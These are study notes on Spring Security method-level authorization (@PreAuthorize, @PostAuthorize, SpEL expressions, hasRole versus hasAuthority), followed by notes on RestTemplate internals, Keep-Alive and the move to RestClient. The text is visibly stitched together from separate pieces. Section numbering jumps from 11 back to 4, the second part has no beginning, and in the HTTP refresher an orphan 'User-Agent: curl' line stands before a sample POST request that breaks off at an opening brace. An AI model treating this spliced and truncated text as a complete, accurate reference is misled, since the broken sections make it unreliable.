    1. What is Role-Based Authorization?

    Authorization is the process of allowing or denying access to specific resources based on the users role or permission.

    Spring Security supports multiple ways to implement authorization, including:

    • Filter-level access control (via .antMatchers().hasRole())
    • Annotation-based (method-level) access control this is our focus

    2. Annotations Used

    Annotation Description
    @PreAuthorize Runs before method execution
    @PostAuthorize Runs after method execution, but before response is sent

    3. Enabling Annotation-Based Authorization

    Add this in your security config:

    @EnableMethodSecurity  // Replaces @EnableGlobalMethodSecurity in Spring Security 6+
public class SecurityConfig {
    // other beans & filters
}
    Without this, @PreAuthorize and @PostAuthorize annotations will be ignored.

    4. Example Usage

    User with Roles and Permissions

    User.withUsername("ganesh")
    .password("{noop}pass123")
    .roles("USER")  // Spring internally stores it as ROLE_USER
    .authorities("ORDER_READ", "SALES_DELETE")  // granular permissions
    .build();

    OrderController

    @RestController
public class OrderController {

    @PreAuthorize("hasRole('USER') and hasAuthority('ORDER_READ')")
    @GetMapping("/orders")
    public String getOrders() {
        return "Order Data";
    }
}

    SalesController

    @RestController
public class SalesController {

    @PreAuthorize("hasAuthority('SALES_READ')")
    @GetMapping("/sales")
    public String getSales() {
        return "Sales Data";
    }
}

    5. hasRole vs hasAuthority

    Method Meaning
    hasRole('ADMIN') Looks for ROLE_ADMIN
    hasAuthority('ADMIN') Looks for exact string ADMIN
    Internally, hasRole('X') appends "ROLE_" prefix.

    6. Expression Language Support (SpEL)

    Spring uses SpEL (Spring Expression Language) to evaluate conditions in @PreAuthorize.

    Logical Operators

    Operator Description Example
    and Logical AND hasRole('ADMIN') and hasAuthority('READ')
    or Logical OR hasRole('ADMIN') or hasRole('USER')
    not / ! Logical NOT !hasRole('ADMIN')

    Relational Operators

    Operator Meaning Example
    == Equal to #id == 100
    != Not equal to #value != 'xyz'
    < > <= >= Comparison operators

    7. Accessing Principal Info (Dynamic Authorization)

    You can access current users info using the authentication object:

    @PreAuthorize("#id == authentication.principal.id")
@GetMapping("/users/{id}")
public User getUserById(@PathVariable Long id) {
    return userService.getUser(id);
}

    8. Post Authorization @PostAuthorize

    Use when you need to authorize based on return object or post-processing logic.

    @PostAuthorize("returnObject.username == authentication.name")
@GetMapping("/user/{id}")
public User getUser(@PathVariable Long id) {
    return userService.findById(id);
}
    Example: Prevent user from accessing someone elses data.

    9. How Does It Work Internally?

    Interceptors:

    • @PreAuthorize is intercepted by: 
      AuthorizationManagerBeforeMethodInterceptor
    • @PostAuthorize is intercepted by: 
      AuthorizationManagerAfterMethodInterceptor

    They:

    1. Parse the annotation string using SpelExpressionParser
    1. Resolve symbols (like authentication.principal)
    1. Create an Abstract Syntax Tree (AST)
    1. Evaluate the expression
    1. Allow or block method execution

    10. Real-World Scenario

    Role Permissions
    ROLE_USER ORDER_READ, ORDER_WRITE
    ROLE_ADMIN All permissions

    Sample:

    @PreAuthorize("hasRole('USER') and hasAuthority('ORDER_WRITE')")
@PostMapping("/orders")
public String createOrder() {
    return "Created";
}

    11. Common Mistakes

    Mistake Fix
    Not enabling @EnableMethodSecurity Add it in your config
    Using hasRole('ADMIN') but setting authority ADMIN Use ROLE_ADMIN or use hasAuthority
    Using @PreAuthorize on constructor or static method Not allowed
    Trying to use request-specific data not available in context Use #paramName properly

    4. Using RestTemplate (Legacy, but Interview Favorite)

    Example:

    RestTemplate restTemplate = new RestTemplate();

String url = "http://localhost:8082/products/1";

Product product = restTemplate.getForObject(url, Product.class);

    Internals of getForObject():

    • Uses HttpURLConnection under the hood via SimpleClientHttpRequestFactory
    • Performs a 3-way TCP handshake
    • Sends the request
    • Waits for response
    • Uses Keep-Alive cache to reuse TCP connections

    5. HTTP Fundamentals Refresher

User-Agent: curl

    Sample POST Request:

    POST /products HTTP/1.1
Host: localhost:8082
Content-Type: application/json

{

    6. What is Keep-Alive?

    • Default in HTTP/1.1
    • Reuses TCP connection for multiple HTTP requests
    • Controlled by headers: 
      Connection: keep-alive
Keep-Alive: timeout=5, max=50
    • Saves time from repeated handshakes

    7. Methods in RestTemplate

    Method Description
    getForObject() Get only body
    getForEntity() Get full response (headers + status + body)
    postForObject() POST + body
    postForEntity() POST + full response
    put() Sends PUT request (no return)
    delete() Sends DELETE request
    exchange() Most flexible allows headers, body, method
    execute() Full manual control using callback interfaces

    exchange() Example:

    HttpHeaders headers = new HttpHeaders();
headers.set("Authorization", "Bearer abc123");

Product product = new Product("Ice-cream", 100);
HttpEntity<Product> requestEntity = new HttpEntity<>(product, headers);

ResponseEntity<Product> response = restTemplate.exchange(
    "http://localhost:8082/products",
    HttpMethod.POST,
    requestEntity,
    Product.class
);

    8. Advanced: Manual execute() with Custom Callbacks

    RequestCallback requestCallback = request -> {
    request.getHeaders().setContentType(MediaType.APPLICATION_JSON);
    byte[] body = new ObjectMapper().writeValueAsBytes(new Product("Ice-cream", 100));
    StreamUtils.copy(body, request.getBody());
};

ResponseExtractor<String> responseExtractor = response ->
    StreamUtils.copyToString(response.getBody(), StandardCharsets.UTF_8);

String response = restTemplate.execute(
    "http://localhost:8082/products",
    HttpMethod.POST,
    requestCallback,
    responseExtractor
);
    Gives full control over headers, serialization, and parsing.

    9. Limitations of RestTemplate

    Issue Why
    Boilerplate-heavy Too many overloaded methods
    No built-in retries Retry/CircuitBreaker not built-in
    Low readability Verbose and imperative
    Maintenance mode Deprecated for RestClient in Spring 6+

    10. Why Move to RestClient?

    Feature Benefit
    Fluent Builder Clean and chainable
    Built-in Config Headers, timeouts, error handlers
    Future-proof Supports reactive & interceptors
    Recommended for Spring Boot 3+ / Spring Framework 6+

    Interview Key Points

    Question Must-Know
    How does RestTemplate work internally? Uses HttpURLConnection, KeepAliveCache, TCP reuse
    When is TCP connection closed? If response stream isnt fully read or Connection: close is sent
    How to reuse TCP? Use Connection: keep-alive (default in HTTP/1.1)
    When to use exchange() vs execute()? exchange() is semi-automatic, execute() is fully manual
    Whats better than RestTemplate in modern Spring? RestClient or FeignClient with Spring Cloud
    How to handle headers and body together? Use HttpEntity<> in exchange()
